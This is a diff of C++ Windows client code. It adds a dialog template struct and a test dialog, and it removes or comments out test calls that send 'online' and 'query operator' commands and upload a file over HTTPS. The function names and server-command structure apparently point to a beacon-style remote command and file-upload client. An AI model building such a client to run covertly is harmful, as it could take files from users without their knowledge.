@@ -30,6 +30,30 @@
 
 using namespace std;
 
+#pragma pack(1)
+
+typedef struct {
+	WORD      dlgVer;
+	WORD      signature;
+	DWORD     helpID;
+	DWORD     exStyle;
+	DWORD     style;
+	WORD      cDlgItems;
+	short     x;
+	short     y;
+	short     cx;
+	short     cy;
+	short menu;
+	short windowClass;
+	WCHAR     title[4];
+	WORD      pointsize;
+	WORD      weight;
+	BYTE      italic;
+	BYTE      charset;
+	WCHAR     typeface[4];
+} DLGTEMPLATEEX;
+#pragma pack()
+
 
 CONST static char g_program_params[MAX_PATH] = "0123456789abcdef";
 
@@ -82,25 +106,6 @@ int clear() {
 
 
 
-int mytestfunc() {
-	int ret = 0;
-	//ret = uploadHttpsFile("test.txt");
-	//ret = uploadFileTest("test.txt");
-
-	char backdata[MAX_SIZE];
-
-	int backsize = MAX_SIZE;
-
-	HttpsProto https(TRUE);
-
-	ret = https.postCmdTest(CMD_ONLINE, backdata,&backsize);
-
-	ret = https.postFileTest("test.txt", backdata, &backsize);
-
-	ret = https.postCmdTest(CMD_QUERY_OPERATOR, backdata, &backsize);
-
-	return ret;
-}
 
 int getProc() {
 	int ret = 0;
@@ -154,6 +159,10 @@ int postProc() {
 	// 	WCHAR wstrcmd[256];
 	// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
 	// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);
+
+	//ret = uploadHttpsFile("test.txt");
+	//ret = uploadFileTest("test.txt");
+	//ret = https.postFileTest("test.txt", backdata, &backsize);
 
 	PacketParcel packet(TRUE);
 
@@ -243,11 +252,55 @@ int __stdcall cmdMission() {
 
 
 
+INT_PTR dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
+{
+	if (msg == WM_INITDIALOG)
+	{
+
+	}
+
+	return TRUE;
+	//return DefWindowProc(hwnd, msg, wparam, lparam);
+}
+
+
+void testmfc() {
+	HMODULE h = GetModuleHandleA(0);
+	int ret = 0;
+
+	DLGTEMPLATEEX dlgex;
+	//HWND m_hwnd = CreateDialogParamA(h, (LPCSTR)IDD_DIALOG7, 0, (DLGPROC)dlgProc, 0);
+	INT_PTR m_hwnd = DialogBoxParamW(h, (LPCWSTR)IDD_DIALOG7,(HWND) 0, (DLGPROC)dlgProc,0);
+	if (m_hwnd == 0)
+	{
+		ret = GetLastError();
+	}
+
+	//ret = ShowWindow(m_hwnd, SW_SHOW);
+
+// 	MSG msg;
+// 	while ((ret = GetMessage(&msg, 0, 0, 0)) != 0) {
+// 
+// 		if (ret == -1) {
+// 			return;
+// 		}
+// 
+// 		if (!IsDialogMessage(m_hwnd, &msg))
+// 		{
+// 			TranslateMessage(&msg);
+// 			DispatchMessage(&msg);
+// 		}
+// 	}
+}
+
+
 int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
 
 	int ret = 0;
 
 	ret = init();
+
+	//testmfc();
 
 	ret = createDialog(hInstance);
 
